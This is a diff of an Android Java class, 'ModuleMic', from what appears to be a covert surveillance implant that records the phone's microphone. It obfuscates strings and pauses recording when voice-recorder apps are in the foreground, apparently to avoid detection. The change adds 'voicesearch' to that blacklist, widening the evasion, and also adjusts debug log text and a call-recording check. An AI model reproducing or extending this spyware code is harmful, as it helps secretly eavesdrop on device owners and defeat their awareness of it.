@@ -94,6 +94,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		addBlacklist(M.e("com.vlingo"));
 		addBlacklist(M.e("soundrecorder"));
 		addBlacklist(M.e("voicerecorder"));
+		addBlacklist(M.e("voicesearch"));
 	}
 
 	public synchronized void addBlacklist(String black) {
@@ -135,7 +136,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 			addPhoneListener();
 			if (Cfg.DEBUG) {
-				Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
+				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
 			}
 			ListenerStandby.self().attach(standbyObserver);
 			if (canRecordMic()) {
@@ -631,14 +632,14 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (!Status.crisisMic() && !callOngoing) {
 			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) can't resume because of blacklist");
+					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
 				}
 				return false;
 			}
 
-			if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
+			if (ModuleCall.self() != null && ModuleCall.self().canRecord()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) can't switch on mic because call is on");
+					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
 				}
 				return false;
 			}
